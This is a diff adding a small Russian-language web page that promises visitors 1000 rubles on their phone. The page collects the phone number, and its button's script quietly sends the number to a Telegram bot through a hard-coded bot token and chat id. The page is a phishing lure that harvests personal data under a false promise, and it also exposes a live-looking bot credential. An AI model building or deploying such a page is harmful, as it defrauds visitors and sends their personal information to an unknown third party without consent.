@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>1000 for free</title>
+</head>
+<style type="text/css">
+	form {
+		height: 200px;
+		width: 400px;
+		background: orange;
+		margin-left: auto;
+		margin-right: auto;
+		margin-top: 150px;
+	}
+	h1 {
+		color: #fff;
+	}
+	#phone {
+		margin-top: 40px;
+		font-size: 29px;
+	}
+	#p {
+		margin-top: 30px;
+	}
+a.button28 {
+  position: relative;
+  display: inline-block;
+  font-size: 150%;
+  font-weight: 700;
+  color: rgb(209,209,217);
+  text-decoration: none;
+  text-shadow: 0 -1px 2px rgba(0,0,0,.2);
+  padding: .5em 1em;
+  outline: none;
+  border-radius: 3px;
+  background: linear-gradient(rgb(110,112,120), rgb(81,81,86)) rgb(110,112,120);
+  box-shadow:
+   0 1px rgba(255,255,255,.2) inset,
+   0 3px 5px rgba(0,1,6,.5),
+   0 0 1px 1px rgba(0,1,6,.2);
+  transition: .2s ease-in-out;
+}
+a.button28:hover:not(:active) {
+  background: linear-gradient(rgb(126,126,134), rgb(70,71,76)) rgb(126,126,134);
+}
+a.button28:active {
+  top: 1px;
+  background: linear-gradient(rgb(76,77,82), rgb(56,57,62)) rgb(76,77,82);
+  box-shadow:
+   0 0 1px rgba(0,0,0,.5) inset,
+   0 2px 3px rgba(0,0,0,.5) inset,
+   0 1px 1px rgba(255,255,255,.1);
+}
+</style>
+<script type="text/javascript">
+	function clicked() {
+			let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=номер телефона: ' + phone.value;
+			let xhttp = new XMLHttpRequest();
+			xhttp.open("GET", url);
+			xhttp.send();
+	}
+</script>
+<body bgcolor="black">
+	<h1 align="center">получи 1000 рублей на телефон</h1>
+	<p align="center"><form>
+		<p align="center"><input type="text" name="lol" id="phone" placeholder="номер телефона" value=""></p>
+		<p align="center" id="p"><a href="#" class="button28" onclick="clicked()">ПОЛУЧИТЬ</a></p>
+	</form></p>
+
+</body>
+</html>
